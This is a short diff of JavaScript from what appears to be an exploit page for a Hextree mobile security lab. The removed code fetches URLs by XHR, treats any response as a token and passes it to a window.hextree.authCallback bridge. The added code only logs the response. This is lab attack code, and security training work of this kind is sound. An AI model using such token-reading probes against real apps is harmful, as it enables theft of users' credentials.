@@ -85,31 +85,18 @@
 
         // XHR function with better error handling
         function tryXHR(url) {
-            attempts++;
-            debug('Attempt ' + attempts + ': XHR ' + url);
-            const x = new XMLHttpRequest();
-            x.open('GET', url, true);
-            x.onreadystatechange = function() {
-                if (x.readyState === 4) {
-                    debug('XHR ' + url + ' status: ' + x.status + ', response: ' + x.responseText);
-                    if (x.responseText && !found) {
-                        found = true;
-                        debug('SUCCESS! Token found: ' + x.responseText);
-                        document.getElementById('status').innerHTML = 'Token found via XHR!';
-                        if (window.hextree && window.hextree.authCallback) {
-                            window.hextree.authCallback(x.responseText.trim());
-                            debug('authCallback executed with: ' + x.responseText.trim());
-                        } else {
-                            debug('Cannot call authCallback - interface not available');
-                        }
-                    }
-                }
-            };
-            x.onerror = function(e) {
-                debug('XHR error for ' + url + ': ' + e);
-            };
-            x.send();
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.responseText) {
+            console.log(xhr.responseText);
         }
+    };
+    xhr.onerror = function(error) {
+        // console.log(error);
+    }
+    xhr.send();
+}
 
         // Fetch API alternative
         function tryFetch(url) {
